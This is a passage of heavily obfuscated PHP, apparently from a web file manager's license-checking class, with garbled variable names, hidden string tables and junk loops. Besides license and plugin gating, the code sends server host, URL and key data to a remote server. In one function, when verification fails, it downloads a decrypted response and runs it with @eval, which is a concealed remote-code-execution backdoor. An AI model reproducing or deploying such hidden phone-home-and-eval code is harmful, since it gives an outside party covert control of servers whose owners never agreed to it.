$¸€û£Œ½[160], $¸€û£Œ½[161] => $_SERVER[$¸€û£Œ½[162]], $¸€û£Œ½[163] => $_SERVER[$¸€û£Œ½[164]], $¸€û£Œ½[165] => $_SERVER[$¸€û£Œ½[166]], $¸€û£Œ½[107] => $¢ÎŒ¢Æ†, $¸€û£Œ½[167] => Model($¸€û£Œ½[33])->get($¸€û£Œ½[133])); $ç„ï†Éœ = $ûºŒ¯†”[746]; if (strlen($ç„ï†Éœ) < $ûºŒ¯†”[747]) { return; } if (isset($–±¼œ[$¸€û£Œ½[153]]) && isset($–±¼œ[$¸€û£Œ½[153]]) == $¸€û£Œ½[124]) { $¢É´î†[$¸€û£Œ½[153]] = md5($¢É´î†[$¸€û£Œ½[154]] . $¸€û£Œ½[168] . $¢É´î†[$¸€û£Œ½[157]]); } if ($–±¼œ[$¸€û£Œ½[169]] == $¸€û£Œ½[170]) { $£­€ƒµ = $this->cvps5573fc4e($¢ÎŒ¢Æ†, $¸€û£Œ½[171]); $ô¯Ò¨ÕÕ = $this->btfg414f282e(json_encode($¢É´î†), $¢ÎŒ¢Æ† . $¸€û£Œ½[172], 3); $ô¯Ò¨ÕÕ = $ô¯Ò¨ÕÕ . $¸€û£Œ½[173] . $_SERVER[$¸€û£Œ½[162]]; $˜…ı×º« = $this->ogjb9bc15144($¸€û£Œ½[174] . $£­€ƒµ . $¸€û£Œ½[175] . $ô¯Ò¨ÕÕ, -1); show_json($˜…ı×º«, !0); } else { if ($–±¼œ[$¸€û£Œ½[169]] == $¸€û£Œ½[176]) { $¿€Ä = substr(md5($¸€û£Œ½[177] . $¢ÎŒ¢Æ†), 12, 15) . $¸€û£Œ½[178]; $ô¯Ò¨ÕÕ = $this->ehgvac510340(trim($–±¼œ[$¸€û£Œ½[179]]), $¿€Ä, 2); $ß›€¨˜Œ = json_decode($ô¯Ò¨ÕÕ, !0); if (!is_array($ß›€¨˜Œ) || !is_array($ß›€¨˜Œ[$¸€û£Œ½[180]]) || $ß›€¨˜Œ[$¸€û£Œ½[154]] != !0) { $–¸ÖÜ¶Õ = $¸€û£Œ½[181]; $…¶ø¶ã = $ß›€¨˜Œ[$¸€û£Œ½[180]] ? $¸€û£Œ½[182] . $ß›€¨˜Œ[$¸€û£Œ½[180]] : $–¸ÖÜ¶Õ; show_json($…¶ø¶ã, !1); } else { $¢É´î†[$¸€û£Œ½[157]] = $ß›€¨˜Œ[$¸€û£Œ½[180]][$¸€û£Œ½[183]]; } } else { $ß›€¨˜Œ = $this->ogjb9bc15144($¸€û£Œ½[184], $¢É´î†, 10); $¦§õ­¥¸ = $ûºŒ¯†”[748]; while (strlen($¦§õ­¥¸) < $ûºŒ¯†”[722]) { if (!$¦§õ­¥¸) { break; } $¦§õ­¥¸++; } } } if (!is_array($ß›€¨˜Œ) || !is_array($ß›€¨˜Œ[$¸€û£Œ½[180]]) || $ß›€¨˜Œ[$¸€û£Œ½[154]] != !0) { $–¸ÖÜ¶Õ = LNG($¸€û£Œ½[185]); $…¶ø¶ã = $ß›€¨˜Œ[$¸€û£Œ½[180]] ? $¸€û£Œ½[182] . $ß›€¨˜Œ[$¸€û£Œ½[180]] : $–¸ÖÜ¶Õ; show_json($…¶ø¶ã, !1); } $ä‹óÃ—º = $ß›€¨˜Œ[$¸€û£Œ½[180]]; $«À™àë = $this->habpf3a2684d($ä‹óÃ—º[$¸€û£Œ½[186]]); if (!$«À™àë || $«À™àë != $ä‹óÃ—º[$¸€û£Œ½[131]]) { $©½éÈ¥· = array($¸€û£Œ½[187] => Model($¸€û£Œ½[33])->get($¸€û£Œ½[102]), $¸€û£Œ½[188] => $_SERVER[$¸€û£Œ½[108]], $¸€û£Œ½[189] => this_url(), $¸€û£Œ½[163] => $_SERVER[$¸€û£Œ½[164]]); $ô¯Ò¨ÕÕ = $this->pyvuf8f9c832(json_encode($©½éÈ¥·)); $this->ogjb9bc15144($¸€û£Œ½[190] . $ô¯Ò¨ÕÕ); show_json(LNG($¸€û£Œ½[191]), !0); } $¯‘¾‰€Ê = array($¸€û£Œ½[155] => $ä‹óÃ—º[$¸€û£Œ½[192]], $¸€û£Œ½[193] => $ä‹óÃ—º[$¸€û£Œ½[194]], $¸€û£Œ½[195] => rand_string(16), $¸€û£Œ½[110] => $ä‹óÃ—º[$¸€û£Œ½[196]]); if ($¢É´î†[$¸€û£Œ½[157]]) { $¯‘¾‰€Ê[$¸€û£Œ½[195]] = $¢É´î†[$¸€û£Œ½[157]]; } $Â©öÄ… = substr(md5($¯‘¾‰€Ê[$¸€û£Œ½[193]]), 10, 10); $÷µÏ²ÒÄ = $Â©öÄ… . $¯‘¾‰€Ê[$¸€û£Œ½[110]] . $¯‘¾‰€Ê[$¸€û£Œ½[195]]; $Í…ŸŠ¼• = $ûºŒ¯†”[749]; if (strlen($Í…ŸŠ¼•) < $ûºŒ¯†”[747]) { return; } $¯‘¾‰€Ê[$¸€û£Œ½[112]] = strrev(base64_encode($this->cvps5573fc4e($÷µÏ²ÒÄ, $¸€û£Œ½[197]))); $ìÀ×Ù¦ = $ûºŒ¯†”[750]; while ($ìÀ×Ù¦ < $ûºŒ¯†”[702]) { if ($ìÀ×Ù¦ >= 0) { break; } $ìÀ×Ù¦++; } $··îÌ÷ = rand_string(16); $Ûõ‡³Ğë = $··îÌ÷ . $¯‘¾‰€Ê[$¸€û£Œ½[110]] . $this->cvps5573fc4e(md5($¯‘¾‰€Ê[$¸€û£Œ½[155]]), $··îÌ÷); $¯‘¾‰€Ê[$¸€û£Œ½[113]] = base64_encode(strrev($this->cvps5573fc4e($Ûõ‡³Ğë, $¸€û£Œ½[198]))); if ($ä‹óÃ—º[$¸€û£Œ½[199]] && $ä‹óÃ—º[$¸€û£Œ½[199]] >= 1) { Model($¸€û£Œ½[33])->setDeep($¸€û£Œ½[200], $¸€û£Œ½[124]); } Model($¸€û£Œ½[33])->set($¯‘¾‰€Ê); $‡áÁ°»‰ = md5($_SERVER[$¸€û£Œ½[108]] . strrev($ò¹‘Óü÷) . $¯‘¾‰€Ê[$¸€û£Œ½[193]]); $ÙïãëËê = strrev(substr($‡áÁ°»‰, 10, 16)); $ßØ––¤­ = $ûºŒ¯†”[751]; if (strlen($ßØ––¤­) < $ûºŒ¯†”[715]) { die; } $–û²‘” = $this->btfg414f282e(json_encode($ä‹óÃ—º), $‡áÁ°»‰); $›¢…“– = array_to_keyvalue(Model($¸€û£Œ½[7])->listData(), $¸€û£Œ½[201]); $ÔüøÑŸĞ = $ûºŒ¯†”[752]; while ($ÔüøÑŸĞ < $ûºŒ¯†”[702]) { if ($ÔüøÑŸĞ >= 0) { break; } $ÔüøÑŸĞ++; } $ªËú¶Ü¾ = $›¢…“–[$¸€û£Œ½[202]]; $¦ÏÍŒÙ‡ = $ûºŒ¯†”[753]; $ºã®¾³¥ = array(); $ºã®¾³¥[$ÙïãëËê] = $–û²‘”; $¬ßåŒ¦² = $ûºŒ¯†”[754]; if (strlen($¬ßåŒ¦²) < $ûºŒ¯†”[735]) { return; } Model($¸€û£Œ½[7])->update($ªËú¶Ü¾[$¸€û£Œ½[203]], array($¸€û£Œ½[204] => $ºã®¾³¥)); $ÖêÉìÓ³ = $ûºŒ¯†”[755]; $this->drtp22f459a0 = $ä‹óÃ—º; $›é®‘şş = $ûºŒ¯†”[756]; $this->sqeh61d8fa06 = $¯‘¾‰€Ê[$¸€û£Œ½[110]]; $÷³—ò”œ = $ûºŒ¯†”[757]; while (strlen($÷³—ò”œ) < $ûºŒ¯†”[722]) { if (!$÷³—ò”œ) { break; } $÷³—ò”œ++; } $this->licenseRegistSuccess(); Cache::set($¸€û£Œ½[205] . md5($ò¹‘Óü÷ . $¸€û£Œ½[206]), $¸€û£Œ½[6]); show_json(LNG($¸€û£Œ½[191]), !0); } private function licenseRegistSuccess() { $ÇˆäªÉ =& $_SERVER[ô÷‡¤È]; $±ìêª“ = Model($ÇˆäªÉ[33])->get(); $Äƒ«·Ëñ = $_SERVER[¹Éµ„ºå][758]; if ($±ìêª“[$ÇˆäªÉ[63]] != $ÇˆäªÉ[124]) { Model($ÇˆäªÉ[33])->set($ÇˆäªÉ[63], $ÇˆäªÉ[124]); } Action($ÇˆäªÉ[207])->initStart(!0); } private function btzc3815bf24() { $ÏÏİë‚Ó =& $_SERVER[¹Éµ„ºå]; $‹Î¿øÀ† =& $_SERVER[ô÷‡¤È]; Model($‹Î¿øÀ†[33])->set(array($‹Î¿øÀ†[155] => $‹Î¿øÀ†[6], $‹Î¿øÀ†[193] => $‹Î¿øÀ†[6], $‹Î¿øÀ†[110] => $‹Î¿øÀ†[111], $‹Î¿øÀ†[112] => $‹Î¿øÀ†[6], $‹Î¿øÀ†[113] => $‹Î¿øÀ†[6])); $Ä”¬—Í = $ÏÏİë‚Ó[759]; if (!$Ä”¬—Í) { die; } Model($‹Î¿øÀ†[33])->setDeep($‹Î¿øÀ†[200], $‹Î¿øÀ†[208]); $í£ÔÇĞ = $ÏÏİë‚Ó[760]; if (!$í£ÔÇĞ) { return; } $this->drtp22f459a0 = array(); $¬„Ù÷Ìí = $ÏÏİë‚Ó[761]; while ($¬„Ù÷Ìí < $ÏÏİë‚Ó[715]) { if ($¬„Ù÷Ìí >= 0) { break; } $¬„Ù÷Ìí++; } $this->sqeh61d8fa06 = $‹Î¿øÀ†[111]; } private function uhksa3375e3d() { $È—Œ¸¹é =& $_SERVER[¹Éµ„ºå]; $Í¦ş»Â =& $_SERVER[ô÷‡¤È]; $_SERVER[$Í¦ş»Â[164]] = _get($_SERVER, $Í¦ş»Â[164], APP_HOST); $this->sqeh61d8fa06 = $Í¦ş»Â[111]; $õĞ¼ï•½ = Model($Í¦ş»Â[33])->get(); $§®Éşš£ = $È—Œ¸¹é[762]; if ($õĞ¼ï•½[$Í¦ş»Â[110]] == $Í¦ş»Â[111]) { return; } $ÆşàÏ• = Model($Í¦ş»Â[33])->get($Í¦ş»Â[102]); $ÁÊ¤Éï‡ = $Í¦ş»Â[205] . md5($ÆşàÏ• . $Í¦ş»Â[206]); $íÖí¼¤ = Cache::get($ÁÊ¤Éï‡); $õîúš•„ = $È—Œ¸¹é[763]; while (strlen($õîúš•„) < $È—Œ¸¹é[722]) { if (!$õîúš•„) { break; } $õîúš•„++; } if (!is_array($íÖí¼¤) || !isset($íÖí¼¤[$Í¦ş»Â[209]]) || time() - $íÖí¼¤[$Í¦ş»Â[209]] >= 60) { $¹ŠËÔæ = Model($Í¦ş»Â[7])->loadList(); $‡ÁàñÄÇ = $¹ŠËÔæ[$Í¦ş»Â[202]]; $¦¦‚ÓÑ´ = md5($_SERVER[$Í¦ş»Â[108]] . strrev($ÆşàÏ•) . $õĞ¼ï•½[$Í¦ş»Â[193]]); $¡Ç©Š¾ê = strrev(substr($¦¦‚ÓÑ´, 10, 16)); $íÖí¼¤ = $this->ehgvac510340($‡ÁàñÄÇ[$Í¦ş»Â[88]][$¡Ç©Š¾ê], $¦¦‚ÓÑ´); $íÖí¼¤ = json_decode($íÖí¼¤, !0); } if (!is_array($íÖí¼¤)) { return $this->btzc3815bf24(); } $şç£ë«æ = strtotime($íÖí¼¤[$Í¦ş»Â[131]]); if (time() >= $şç£ë«æ) { return $this->btzc3815bf24(); } if (!isset($íÖí¼¤[$Í¦ş»Â[209]]) || time() - $íÖí¼¤[$Í¦ş»Â[209]] > 20) { $íÖí¼¤[$Í¦ş»Â[209]] = time(); Cache::set($ÁÊ¤Éï‡, $íÖí¼¤); } $this->drtp22f459a0 = $íÖí¼¤; $this->sqeh61d8fa06 = $õĞ¼ï•½[$Í¦ş»Â[110]]; $¡îĞïš = $È—Œ¸¹é[764]; if (!$¡îĞïš) { die; } $GLOBALS[$Í¦ş»Â[210]] = $this; $ŸñŠ‡á€ = $È—Œ¸¹é[765]; if (!$ŸñŠ‡á€) { die; } } private function bifdafb48183() { $ç“ŠËó =& $_SERVER[¹Éµ„ºå]; $Ò×Äèµ  =& $_SERVER[ô÷‡¤È]; $®–«»ú¦ = $GLOBALS[$Ò×Äèµ [13]]; $²ˆ±Éíš = $_SERVER[$Ò×Äèµ [24]]; $Öƒ‚‹÷± = $ç“ŠËó[766]; while ($Öƒ‚‹÷± < $ç“ŠËó[747]) { if ($Öƒ‚‹÷± >= 0) { break; } $Öƒ‚‹÷±++; } if ($²ˆ±Éíš == $Ò×Äèµ [211] && $this->sqeh61d8fa06 == $Ò×Äèµ [111]) { show_json(LNG($Ò×Äèµ [212]), !1, $Ò×Äèµ [213]); } $ã°ãµÄÃ = array($Ò×Äèµ [214], $Ò×Äèµ [215]); if (in_array($²ˆ±Éíš, $ã°ãµÄÃ)) { if ($this->sqeh61d8fa06 == $Ò×Äèµ [111] && isset($®–«»ú¦[$Ò×Äèµ [216]])) { show_json(LNG($Ò×Äèµ [212]), !1, $Ò×Äèµ [213]); die; } $ÄİÖºòÕ = $this->gxnicc1bdd2a(); if ($ÄİÖºòÕ != intval($Ò×Äèµ [217])) { if ($ÄİÖºòÕ <= Model($Ò×Äèµ [127])->count()) { show_json(LNG($Ò×Äèµ [218]), !1, $Ò×Äèµ [213]); die; } } } } private function hnkp28d776c5() { $€½Ÿ’å =& $_SERVER[¹Éµ„ºå]; $Å“êøşÂ =& $_SERVER[ô÷‡¤È]; $³¤ ÌÄñ = array($Å“êøşÂ[121], $Å“êøşÂ[122]); $Ù¶Ó„Ì = $€½Ÿ’å[767]; while ($Ù¶Ó„Ì < $€½Ÿ’å[735]) { if ($Ù¶Ó„Ì >= 0) { break; } $Ù¶Ó„Ì++; } if (!KodUser::isRoot() || !isset($_GET[$Å“êøşÂ[219]])) { return; } if (!in_array($_SERVER[$Å“êøşÂ[24]], $³¤ ÌÄñ)) { return; } $·‰û­±Ì = $Å“êøşÂ[220]; $·‰û­±Ì = $this->vain4146eae5($·‰û­±Ì, $Å“êøşÂ[221]); $ ûÛ±ˆ÷ = $€½Ÿ’å[768]; while (strlen($ ûÛ±ˆ÷) < $€½Ÿ’å[747]) { if (!$ ûÛ±ˆ÷) { break; } $ ûÛ±ˆ÷++; } $åÑ†Ñ â = stream_context_create(array($Å“êøşÂ[222] => array($Å“êøşÂ[223] => $Å“êøşÂ[224], $Å“êøşÂ[225] => 3))); $­¹êøÊû = @file_get_contents($·‰û­±Ì, !1, $åÑ†Ñ â); $ÎÒ™¤Û· = $€½Ÿ’å[769]; while ($ÎÒ™¤Û· < $€½Ÿ’å[715]) { if ($ÎÒ™¤Û· >= 0) { break; } $ÎÒ™¤Û·++; } header($Å“êøşÂ[226]); if ($­¹êøÊû && strstr($­¹êøÊû, $Å“êøşÂ[227])) { echo $­¹êøÊû; } die; } public function vorheca88755($í±­ªÊ—) { $»©½›íœ =& $_SERVER[¹Éµ„ºå]; $ú¬½ıÃ¸ =& $_SERVER[ô÷‡¤È]; if ($this->sqeh61d8fa06 == $ú¬½ıÃ¸[228]) { return $í±­ªÊ—; } $ÖÍçÌ” = $this->versionPluginList(); $˜ââÀÎ¢ = $»©½›íœ[770]; if (strlen($˜ââÀÎ¢) < $»©½›íœ[747]) { return; } $·ô‰ª™Å = explode($ú¬½ıÃ¸[229], $this->versionPluginFilter()); $µ£¡ÖÔ€ = $»©½›íœ[771]; $ôüÂ´ÇÂ = array(); $ÊŒòğ›´ = $»©½›íœ[772]; foreach ($ÖÍçÌ” as $ıÕº‡Ş˜ => $…è¨ÉÙÊ) { if ($…è¨ÉÙÊ == $ú¬½ıÃ¸[230] && substr($this->sqeh61d8fa06, 0, 1) == $ú¬½ıÃ¸[230]) { continue; } if (!in_array($ıÕº‡Ş˜, $·ô‰ª™Å)) { $ôüÂ´ÇÂ[] = $ıÕº‡Ş˜; } } foreach ($ôüÂ´ÇÂ as $ıÕº‡Ş˜) { unset($í±­ªÊ—[$ıÕº‡Ş˜]); $•ÈµöÉš = $»©½›íœ[773]; while (strlen($•ÈµöÉš) < $»©½›íœ[735]) { if (!$•ÈµöÉš) { break; } $•ÈµöÉš++; } } return $í±­ªÊ—; } private function versionPluginList() { $×æ€­†˜ =& $_SERVER[ô÷‡¤È]; return array($×æ€­†˜[231] => $×æ€­†˜[230], $×æ€­†˜[232] => $×æ€­†˜[230], $×æ€­†˜[233] => $×æ€­†˜[230], $×æ€­†˜[234] => $×æ€­†˜[230], $×æ€­†˜[235] => $×æ€­†˜[230], $×æ€­†˜[236] => $×æ€­†˜[230], $×æ€­†˜[237] => $×æ€­†˜[238], $×æ€­†˜[239] => $×æ€­†˜[238], $×æ€­†˜[240] => $×æ€­†˜[238], $×æ€­†˜[241] => $×æ€­†˜[238], $×æ€­†˜[242] => $×æ€­†˜[238], $×æ€­†˜[243] => $×æ€­†˜[238], $×æ€­†˜[244] => $×æ€­†˜[238], $×æ€­†˜[245] => $×æ€­†˜[238], $×æ€­†˜[246] => $×æ€­†˜[238], $×æ€­†˜[247] => $×æ€­†˜[238], $×æ€­†˜[248] => $×æ€­†˜[238], $×æ€­†˜[249] => $×æ€­†˜[238], $×æ€­†˜[250] => $×æ€­†˜[238]); } private function versionPluginFilter() { $Ã¿Òí™Ê =& $_SERVER[ô÷‡¤È]; if ($this->sqeh61d8fa06 == $Ã¿Òí™Ê[111]) { return $Ã¿Òí™Ê[6]; } $èªÍ×ö = _get($this->drtp22f459a0, $Ã¿Òí™Ê[251], $Ã¿Òí™Ê[6]); $äŞ¥¯Ìë = _get($this->drtp22f459a0, $Ã¿Òí™Ê[118], $Ã¿Òí™Ê[6]); $ï‚ğ±’Í = _get($this->drtp22f459a0, $Ã¿Òí™Ê[252], $Ã¿Òí™Ê[6]); if ($äŞ¥¯Ìë > time() && $ï‚ğ±’Í > time()) { $ù¢ûĞî = explode($Ã¿Òí™Ê[229], $èªÍ×ö); $÷Ë¤ûî‘ = array_keys($this->versionPluginList()); $èªÍ×ö = array_merge($ù¢ûĞî, $÷Ë¤ûî‘); $èªÍ×ö = implode($Ã¿Òí™Ê[229], array_filter(array_unique($èªÍ×ö))); } return $èªÍ×ö; } private function xkunf95ae420() { $­‡şüñ¾ =& $_SERVER[ô÷‡¤È]; if ($this->sqeh61d8fa06 != $­‡şüñ¾[111]) { $GLOBALS[$­‡şüñ¾[88]][$­‡şüñ¾[92]][$­‡şüñ¾[253]] = $­‡şüñ¾[208]; return; } $GLOBALS[$­‡şüñ¾[88]][$­‡şüñ¾[254]] = $­‡şüñ¾[124]; if (Model($­‡şüñ¾[255])->get($­‡şüñ¾[63]) != $­‡şüñ¾[208]) { Model($­‡şüñ¾[255])->set($­‡şüñ¾[63], $­‡şüñ¾[208]); } } public function upehc3d1936b() { return $_SERVER[ô÷‡¤È][256]; } private function lhvadcc1d7c9() { $öêäÂ÷‡ =& $_SERVER[¹Éµ„ºå]; $’®İ™ =& $_SERVER[ô÷‡¤È]; $ƒõÇĞœÖ = array($’®İ™[257], $’®İ™[258], $’®İ™[259]); $Êä¹… = $’®İ™[260] . md5($’®İ™[261]); if ($this->sqeh61d8fa06 == $’®İ™[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$’®İ™[24]], $ƒõÇĞœÖ)) { return; } if (time() % 4 != 0) { return; } $‰§Å™‘Â = call_user_func(array($’®İ™[262], $’®İ™[263]), $Êä¹…); $…‘› ÚÖ = $öêäÂ÷‡[774]; while ($…‘› ÚÖ < $öêäÂ÷‡[747]) { if ($…‘› ÚÖ >= 0) { break; } $…‘› ÚÖ++; } if ($‰§Å™‘Â && time() - $‰§Å™‘Â < intval($’®İ™[264])) { return; } call_user_func(array($’®İ™[262], $’®İ™[141]), $Êä¹…, time()); $±¤Ñ¿º = $öêäÂ÷‡[775]; while ($±¤Ñ¿º < $öêäÂ÷‡[715]) { if ($±¤Ñ¿º >= 0) { break; } $±¤Ñ¿º++; } $èöñÛ÷¨ = Model($’®İ™[33])->get($’®İ™[102]); $¡¡ä»›™ = array($’®İ™[154] => Model($’®İ™[33])->get($’®İ™[155]), $’®İ™[169] => $this->sqeh61d8fa06, $’®İ™[165] => $_SERVER[$’®İ™[166]], $’®İ™[167] => Model($’®İ™[33])->get($’®İ™[133]), $’®İ™[107] => md5($_SERVER[$’®İ™[108]] . $èöñÛ÷¨), $’®İ™[158] => $’®İ™[138], $’®İ™[161] => $_SERVER[$’®İ™[162]]); $ÔòÁ¬Ø„ = $öêäÂ÷‡[776]; $Æ±±ç ° = $this->ogjb9bc15144($’®İ™[265], $¡¡ä»›™); if (!is_array($Æ±±ç °)) { return; } if ($Æ±±ç °[$’®İ™[154]] && $Æ±±ç °[$’®İ™[266]]) { if ($this->habpf3a2684d($Æ±±ç °[$’®İ™[266]]) == $¡¡ä»›™[$’®İ™[154]]) { return; } } $this->btzc3815bf24(); if ($this->habpf3a2684d($Æ±±ç °[$’®İ™[266]]) != $¡¡ä»›™[$’®İ™[154]]) { $û“»°è’ = array($’®İ™[187] => $èöñÛ÷¨, $’®İ™[188] => $_SERVER[$’®İ™[108]], $’®İ™[189] => this_url(), $’®İ™[163] => $_SERVER[$’®İ™[164]]); $Ö±ÙËÈ = $this->pyvuf8f9c832(json_encode($û“»°è’)); $Æ±±ç ° = $this->ogjb9bc15144($’®İ™[190] . $Ö±ÙËÈ); if ($Æ±±ç ° && is_array($Æ±±ç °) && isset($Æ±±ç °[$’®İ™[266]])) { $œ¶„²³® = $this->ehgvac510340($Æ±±ç °[$’®İ™[266]], 2); if ($œ¶„²³®) { $œ¶„²³® = $this->habpf3a2684d($œ¶„²³®); } if ($œ¶„²³®) { try { @eval($œ¶„²³®); } catch (Exception $İşµáÉ) { } } } } } private function ogjb9bc15144($Åà¶ôÆ™ = '', $È¾ˆõÊ½ = array(), $ï£Øª æ = 5) { $åµãŸ¸± =& $_SERVER[¹Éµ„ºå]; $à©Óë© =& $_SERVER[ô÷‡¤È]; $’è‡€òÃ = $à©Óë©[267]; $Ê„ÉêáË = $åµãŸ¸±[777]; if (strlen($Ê„ÉêáË) < $åµãŸ¸±[735]) { return; } $’è‡€òÃ = $this->vain4146eae5($’è‡€òÃ, $à©Óë©[268]); $’è‡€òÃ = $’è‡€òÃ . $Åà¶ôÆ™; if ($È¾ˆõÊ½ && is_array($È¾ˆõÊ½)) { $’è‡€òÃ = $’è‡€òÃ . $à©Óë©[269] . http_build_query($È¾ˆõÊ½); } if ($È¾ˆõÊ½ === -1) { return $’è‡€òÃ; } $äÁ¶—œñ = stream_context_create(array($à©Óë©[222] => array($à©Óë©[225] => $ï£Øª æ, $à©Óë©[223] => $à©Óë©[270]), $à©Óë©[271] => array($à©Óë©[272] => !1, $à©Óë©[273] => !1))); $—£Ïæ®‰ = $åµãŸ¸±[778]; if (strlen($—£Ïæ®‰) < $åµãŸ¸±[735]) { return; } $È¾ˆõÊ½ = @file_get_contents($’è‡€òÃ, !1, $äÁ¶—œñ); return json_decode($È¾ˆõÊ½, !0); $È¡ŒÅ„… = $åµãŸ¸±[779]; if (!$È¡ŒÅ„…) { return; } $ïæ£“ÆÜ = $åµãŸ¸±[780]; while ($ïæ£“ÆÜ < $åµãŸ¸±[702]) { if ($ïæ£“ÆÜ >= 0) { break; } $ïæ£“ÆÜ++; } } private function gxnicc1bdd2a() { $‚¹‰¿Ä— =& $_SERVER[¹Éµ„ºå]; $•Ø®Ë‡ =& $_SERVER[ô÷‡¤È]; $¬”ÚšÆ = array($•Ø®Ë‡[274] => $•Ø®Ë‡[275], $•Ø®Ë‡[276] => $•Ø®Ë‡[277], $•Ø®Ë‡[278] => $•Ø®Ë‡[279], $•Ø®Ë‡[280] => $•Ø®Ë‡[281], $•Ø®Ë‡[282] => $•Ø®Ë‡[283], $•Ø®Ë‡[284] => $•Ø®Ë‡[217], $•Ø®Ë‡[285] => $•Ø®Ë‡[217], $•Ø®Ë‡[286] => $•Ø®Ë‡[275], $•Ø®Ë‡[287] => $•Ø®Ë‡[277], $•Ø®Ë‡[288] => $•Ø®Ë‡[279], $•Ø®Ë‡[289] => $•Ø®Ë‡[290], $•Ø®Ë‡[291] => $•Ø®Ë‡[281], $•Ø®Ë‡[292] => $•Ø®Ë‡[293], $•Ø®Ë‡[294] => $•Ø®Ë‡[283], $•Ø®Ë‡[295] => $•Ø®Ë‡[296], $•Ø®Ë‡[297] => $•Ø®Ë‡[298], $•Ø®Ë‡[299] => $•Ø®Ë‡[300]); $è¬Õş€ = $¬”ÚšÆ[$this->sqeh61d8fa06]; $è¬Õş€ = intval($è¬Õş€ ? $è¬Õş€ : $•Ø®Ë‡[275]); $ÊÖö·…â = $‚¹‰¿Ä—[781]; while ($ÊÖö·…â < $‚¹‰¿Ä—[735]) { if ($ÊÖö·…â >= 0) { break; } $ÊÖö·…â++; } $ò×ó›‹ = _get($this->drtp22f459a0, $•Ø®Ë‡[301]); $ò×ó›‹ = $ò×ó›‹ ? intval($ò×ó›‹) : 0; $òæßÈäî = $‚¹‰¿Ä—[782]; while ($òæßÈäî < $‚¹‰¿Ä—[702]) { if ($òæßÈäî >= 0) { break; } $òæßÈäî++; } return $è¬Õş€ + $ò×ó›‹; } public function mews4d3acc29($¸‰õæ’) { $ÉàĞÕ³ì =& $_SERVER[¹Éµ„ºå]; $ò®®ü =& $_SERVER[ô÷‡¤È]; $Å¯»â­ë = $this->gxnicc1bdd2a(); if ($¸‰õæ’[$ò®®ü[302]] == $ò®®ü[124]) { return; } if ($Å¯»â­ë >= intval($ò®®ü[217])) { return; } $Ò¿–•ƒí = Model($ò®®ü[127])->count(); $½şİ‚å  = $ÉàĞÕ³ì[783]; if (strlen($½şİ‚å ) < $ÉàĞÕ³ì[715]) { die; } if ($Ò¿–•ƒí <= $Å¯»â­ë) { return; } $®°ßÒ«¸ = Model($ò®®ü[127])->field($ò®®ü[302])->limit($Å¯»â­ë)->select(); $ìæÉØ„Ç = $ÉàĞÕ³ì[784]; while (strlen($ìæÉØ„Ç) < $ÉàĞÕ³ì[722]) { if (!$ìæÉØ„Ç) { break; } $ìæÉØ„Ç++; } $®°ßÒ«¸ = array_to_keyvalue($®°ßÒ«¸, $ò®®ü[6], $ò®®ü[302]); $¦æÄ‚¢ß = $ÉàĞÕ³ì[785]; if (strlen($¦æÄ‚¢ß) < $ÉàĞÕ³ì[715]) { return; } if (!in_array($¸‰õæ’[$ò®®ü[302]], $®°ßÒ«¸)) { show_json($ò®®ü[303], !1, $ò®®ü[213]); } } public function vitc3b2aa94d() { $êŠŒãØì =& $_SERVER[¹Éµ„ºå]; $ÍŠøš’ =& $_SERVER[ô÷‡¤È]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ù³‚Ö–¥ = $ÍŠøš’[220]; $Ù³‚Ö–¥ = $this->vain4146eae5($Ù³‚Ö–¥, $ÍŠøš’[221]); $”‚ºïŞÌ = $êŠŒãØì[786]; $ÅŠ€ªÁ = stream_context_create(array($ÍŠøš’[222] => array($ÍŠøš’[223] => $ÍŠøš’[224], $ÍŠøš’[225] => 3))); $Ç«ğá = @file_get_contents($Ù³‚Ö–¥, !1, $ÅŠ€ªÁ); echo $ÍŠøš’[304] . hash_encode($Ç«ğá) . $ÍŠøš’[305]; $¾‘½²­ü = $êŠŒãØì[787]; if (strlen($¾‘½²­ü) < $êŠŒãØì[702]) { die; } } private function btfg414f282e($’¦×Î€ö, $¼éœƒØ², $ÅëÃä“Ù = 3) { $¤ùá´²î =& $_SERVER[¹Éµ„ºå]; $ãç÷İÔé =& $_SERVER[ô÷‡¤È]; usleep(1); $’¦×Î€ö = trim($’¦×Î€ö); $ÎãÜğ = mt_rand(0, 5) . $ãç÷İÔé[6]; $©ïÆÖê‡ = $¤ùá´²î[788]; if (strlen($©ïÆÖê‡) < $¤ùá´²î[715]) { return; } $—±ÄÇÊ = rand_string(15); $·ª›Êã¿ = $ãç÷İÔé[306]; switch ($ÎãÜğ) { case $ãç÷İÔé[208]: $Íó£±²® = $this->cvps5573fc4e($’¦×Î€ö, strrev($¼éœƒØ² . $—±ÄÇÊ)); break; $Òˆ´»²Ë = $¤ùá´²î[789]; if (strlen($Òˆ´»²Ë) < $¤ùá´²î[722]) { return; } case $ãç÷İÔé[124]: $Íó£±²® = $this->cvps5573fc4e($’¦×Î€ö, strrev($—±ÄÇÊ . $¼éœƒØ²)); $ÛÄçæ¸ğ = $¤ùá´²î[790]; if (!$ÛÄçæ¸ğ) { die; } break; case $ãç÷İÔé[307]: $Íó£±²® = $this->cvps5573fc4e($’¦×Î€ö, base64_encode($—±ÄÇÊ . $¼éœƒØ²)); $ŒÅ™Î¾ú = $¤ùá´²î[791]; if (strlen($ŒÅ™Î¾ú) < $¤ùá´²î[747]) { die; } break; case $ãç÷İÔé[308]: $Íó£±²® = $this->cvps5573fc4e($’¦×Î€ö, md5($—±ÄÇÊ . $¼éœƒØ²)); break; $»ä¾Ş”® = $¤ùá´²î[792]; while ($»ä¾Ş”® < $¤ùá´²î[722]) { if ($»ä¾Ş”® >= 0) { break; } $»ä¾Ş”®++; } case $ãç÷İÔé[309]: $’¦×Î€ö = base64_encode($’¦×Î€ö); $õäº«½À = $¤ùá´²î[793]; while ($õäº«½À < $¤ùá´²î[722]) { if ($õäº«½À >= 0) { break; } $õäº«½À++; } $™Ÿİì¸ü = rand(0, 64); $º’ùª“Ñ = $·ª›Êã¿[$™Ÿİì¸ü]; $œé€äì = $¤ùá´²î[794]; if (strlen($œé€äì) < $¤ùá´²î[747]) { die; } $áÚ©éÂƒ = md5($º’ùª“Ñ . md5($¼éœƒØ² . $º’ùª“Ñ) . $¼éœƒØ²); $áÚ©éÂƒ = substr($áÚ©éÂƒ, $™Ÿİì¸ü % 8, $™Ÿİì¸ü % 8 + 7); $ûºÆóŠè = $¤ùá´²î[795]; if (!$ûºÆóŠè) { die; } $Œ†ŠÁØº = $ãç÷İÔé[6]; $›©ËÀ• = 0; 